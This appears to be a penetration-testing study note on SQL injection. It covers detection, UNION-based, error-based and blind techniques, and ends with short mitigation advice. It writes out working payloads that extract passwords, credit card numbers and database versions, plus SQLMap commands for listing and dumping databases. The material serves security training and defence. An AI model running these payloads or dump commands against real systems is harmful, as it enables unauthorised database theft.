
# sql injection (SQLi)

A SQL injection attack exploits sql commands and queries made by a web application. SQL injection is a *severe* vulnerability that can lead to complete database compromise. SQL injections are normally tested early on because of their high impact and ease of exploitation.

Successful exploitation can lead to an attacker being able to:

* install shells / create arbitrary files
* pivot into other networks or machines
* write to the database
* delete the database
* read the database
* run OS commands

Databases can contain sensitive information not limited too...

* users information and password
* confidential information
* credit card numbers
* credentials

> SQL: Structured Query Langague

## Connector example
```
          application
        |             |
driver manager        |    
      |     |         |
      |    DSN Configuration
      |     |         |
    Connector/ODBC    |
            |         |
            MySQL Server
```

=================================

## SQL injection basics

Before being able to carry out an attack you must know some SQL basics:

* SQL statement syntax
* How to perform a query
* How to union the results to queries
* the DISTINCT and ALL operator
* How comments work

## SQL statements: SELECT

```
SELECT name, description FROM products WHERE id=9;
```

This sql statement will select the name and description fields from the product table if the product id is equal to 9. The general pattern for selecting is...

```
SELECT <columns list> FROM <table> WHERE <conditions>
```

## Selecting constant values

```
SELECT 22, 'string', 0x12, 'another string'
```

## SQL statements: DISTINCT

You can use DISTICT to filter out duplicate entries

```
SELECT DISTINCT <field list> <remainder of the statement>
```

## SQL statements: UNION

The UNION operator implies DISTINCT by default...

```
<SELECT statement> UNION <another SELECT statement>
```

Use the ALL operator to prevent this behaviour...

```
<SELECT statement> UNION ALL <another SELECT statement>
```

## SQL statements: Comments

* \# (hash)
* -- (two dashes followed by  space)

```
SELECT field from table; # this is a comment
SELECT field from table; -- this is another comment
```

## Example UNION

```
SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts
```

## With chosen data

```
SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT 'MONZ', 'WOZ', 'HERE'
```

## Vulnerable dynamic queries

SQL injection normally occurs if some dynamic input is used to modify a SQL query. The input is not sanitized allowing arbitrary SQL to be sent to the DB.

```
SELECT Name, Description FROM Products WHERE id='$unsanitized_dynamic_variable_from_php'
```

Where `$unsanitized_dynamic_variable_from_php` is equal to `' OR 'monz' = 'monz'`. Thus generating...

```
SELECT Name, Description FROM Products WHERE id='' OR 'monz'='monz'
```

Because monz equals monz the query is saying.. check for an id that equals '' OR true. The second clause is *always* true... meaning that the entire condition becomes true. This effectively returns the *entire* table.

```
# Example using UNION
SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 1=1;
```

## Types of SQL injection

* In-band
* Error-based
* Blind

## In-band SQL injection

leverages the same channel used to inject the SQL code. The output from the statement can typically be seen in the web pages response.

## Error based SQL injection

To exploit error based SQL injection the pentester must use advanced DBMS features. Errors can be generated via the web pages output, sending automated emails or other methods.

## Blind SQL injection

Web applications vulnerable to blind SQL injection do not reflect the SQL query results to the web page. This means that *inference* or other forms of deduction must be used to validate the injection worked or retrieve its results. An example may be using timing to produce different response times based on true or false conditions.

===========================================================================

## Finding SQL injections

One common method is to probe input that generates SQL queries with characters that are known to be invalid to try and generate errors. A SQL error will indicate the presence of a dynamically generated SQL query.

eg.

* , commas
* \` back ticks

During the information gathering phase you should make a note of inputs that are used to build dynamically generated queries.

Check...

* GET requests
* POST requests
* HEADERS
* COOKIES

When testing input try...

* string terminators ' and "
* SQL commands: SELECT, UNION and others
* SQL comments: # or --

## SQL errors

A blind SQL injection may exist but it will not display an error via the front facing website. In-band and error based SQL injections may display their errors in the page response.

A typical MS-SQL error looks like this...
```
incorrect syntax near [query snippet]
```

A typical MySQL error looks more like this...
```
You have an error in your SQL syntax. Check the manual that corresponds to your MySQL server version for the right syntax to use near [query snippet]
```

Errors are visible like this in the page indicate the web application is likely vulnerable to SQL injection. You will need to make an educated guess to whether the web app is vulnerable sometimes. The presence of errors will not guarantee its vulnerable.

Most production website do not display errors, the errors are normally enabled during development to help developers find and fix bugs.

## Boolean based detection techniques

If the website does not display errors it is still possible to test for a vulnerability using a *boolean based detection technique*.

The idea behind this process is simple yet clear. The idea is to create queries that product true/false conditions. The results of these queries can be used to infer results by looking at how the application behaves in each condition.

```
and 1=1
and 1=2
```

The always true condition 1=1 does not display any errors and works... the always false condition 1=2 does not work. Even though the page does not explicitly show errors. With the use of always true or always false conditions and by looking at the behaviour of the website its still possible to infer whether the injection was successful.

# Exploiting in-band sql injection

In band SQL injection techniques make the retrieval of data extremely powerful thanks to the use of the UNION command. That's why in-band sql injection is sometimes called UNION-based SQL injection.

The UNION statement combines the result of two or more SELECT statements...
```
SELECT real_name FROM users WHERE id=9999 UNION ALL SELECT cc_num FROM CreditCards WHERE user_id=1; -- -
```
There is no user with the id 9999 so this outputs the cc_num of the first user in the table.

Using `; -- -` comments out the rest of the SQL code.

* The field types of the second SELECT statement should match the ones in the first statement.
* The number of fields in the second SELECT should match the number of fields in the first statement.
* To successfully perform the attack, you need to know the tables and column names.

## Enumerate the columns

To find out the number of columns and their type using enumeration where 9999 is an invalid id.

```
id=9999 UNION SELECT NULL; -- -
id=9999 UNION SELECT NULL, NULL; -- -
id=9999 UNION SELECT NULL, NULL, NULL; -- -
```

Iteratively add null fields until any error message disappears. You can then balance any UNION query with the correct number of fields.

If the web application does not display errors we can do the same procedure with a valid id. You then iterate the same procedure until the entire query is valid.

```
# infers the correct number of colums,
# adding null fields eventually creates a successful query
# even though the web app does not display errors
1128` UNION SELECT null,null; -- -
```

## Identify field types

After identifying the number of fields, we need to find their *type*. Most of the DBMSs perform type enforcing on their queries.

e.g.

You cannot perform a UNION between an integer and a string...

```
SELECT 1 UNION 'a';
```

### Table of DBMS type enforcing
```
-----------------------------------------

DBMS               |   TYPE ENFORCING
_________________________________________
MySQL              |   No
MS SQL server      |   Yes
Oracle             |   Yes
PostgreSQL         |   Yes
```

### Finding out the field types

Finding the data types used in the query is again an iterative process where you will...

* substitute one of the null fields in our payload with a constant
* if the constant type is correct the query will work
* if the type is wrong the web application will output an error or misbehave

e.g.

```
' UNION SELECT 1, null; -- -
' UNION SELECT 1, 1; -- - # gives an error
' UNION SELECT 1, 'a'; -- - # works inferring second column is a string type
```

The columns and field types are generally needed to perform data extraction.

# Exploiting error based sql injection

Error based SQL injections are another way to retrieve data from the database. The aim is to trigger advanced DBMS functions to trigger an error. The hope is that this error message can be intercepted by the pentester.

Sometimes this error is reflected directly via the websites output however it could also be part of an email or a log message. This depends entirely on the application configuration.

Error based SQL injection is available on...

* Oracle
* PostgreSQL
* MS SQL Server

Depending on how generous the DBMS is you can retrieve useful information from these errors including:

* database names
* schemas
* data

## Example: trigger a type conversion error in MS SQL Server + ASP.net

Vulnerable app: `http://ecommerce.asp?id=1`

Exploit:
```
999999999 or 1 in (SELECT TOP 1 CAST(<FIELDNAME> as varchar(4096)) from <TABLENAME> WHERE <FIELDNAME> NOT IN (<LIST>))
```

* 99999999 is a bogus value because we want the *or* part of the condition to run
* <FIELDNAME> is the column we want to dump but it can be a function like `@@version`

Retrieving the SQL Server version

```
9999999999 or 1 in (SELECT TOP 1 CAST(@@version as varchar(4096))) --
```

## Extracting information

* user_name()
* db_name(0)
* db_name(1)

## Developing error based SQL inhection payloads

* [MSSQL injection cheat sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
* [MySQL injection cheat sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
* [PostgreSQL injection cheat sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)

# Exploiting blind SQL injections

Blind SQL injection exploitation is an inference methodology you can use to extract database schemas and data. This involves crafting a boolean based SQLi payload that transforms a query into a true or false condition. The result of this condition reflects its state to the web application output in some way.

Test payload that is always false...

```
' OR '1' = '11'
```

Then try with an always true condition to verify a SQL injection. Once this has been established its possible to ask the DB yes / no questions like...

* is the first letter of the username 'a'?
* does the database contain three tables?
* and so on...

## Example: substring

Using the MySQL functions `user()` and `substring()`, user() returns the name of the use currently using the database. Substring returns a substring of a string...

```
select substring(user(), 1, 1) = 'r' # true
select substring(user(), 1, 1) = 'a' # false
```

## Example: time based

Cause the DB to wait or do some work to infer based on timing...

```
if (select user) = 'sa' waitfor delay '0:0:5'

IF EXISTS (SELECT * FROM users WHERE username = 'monz') BENCHMARK(1000000, MD5(1))
```

======================================================================

# TOOL : SQLMap

SQLMap is a tool used for detecting and exploiting sql injection.

> WARNING! Always test by hand first before using an automated tool because it may crash your targets system. You can correctly configure your tool if you know what your doing. Blindly running tools makes you a script kiddie not a professional.

## Syntax

```
sqlmap -u <URL> -p <injection_parameters> [options]
```

## Example union based in-band SQLi GET

```
sqlmap -u 'http://target.net?id=1111' -p id --technique=U
```

## Example union based in-band SQLi POST

```
sqlmap -u <URL> --data=<POST_STRING> -p paramter [options]
```

In burp

* intercept request
* right click on it and click `copy to file`

```
sqlmap -r <request_file> -p parameter [options]
```

## More examples

```
# Example extract database banner
sqlmap -u <TARGET> --banner <other options>

# Example list users
sqlmap -u <TARGET> --users <other options>

# Example is dba?
sqlmap -u <TARGET> --is-dba <other options>

# Example available dbs
sqlmap -u <TARGET> --dbs <other options>

# Choose a database
sqlmap -u <TARGET> -D <database> --tables <other options>

# list columns
sqlmap -u <TARGET> -D <database> -T <tables, comma seperated> --columns <other options>

# dump output
sqlmap -u <TARGET> -D <database> -T <table> -C <columns list> --dump <other options>

```

## Forcing the DBMS

```
sqlmap --dbms=<DBMS>
```

A list of DBMS...

* MySQL
* Oracle
* postgreSQL
* Microsoft SQL Server
* Microsoft Access
* SQLite
* Firebird
* Sybase
* SAP MaxDB
* DB2

## --string & --not-string

Web applications sometimes change their output in a way theat SQLMap cannot understand making blind exploitation impossible. In this scenario...

* append --string a string which is always present in true output pages
* append --not-string a string which is always present in false output pages

```
sqlmap -u <TARGET> --string "apache"
sqlmap -u <TARGET> --suffix "'));'
```

## more flags
```
--risk
--level
--keep-alive
--threads
--technique
```

=====================================================

# Mitigation strategies

SQLi vulnerabilities are input validation vulnerabilities and can be prevented by enforcing input validation on any user-controlled paramter.

## PHP remediations

* use bind variables
* use prepared statement
* perform type casting
* white-list based validation
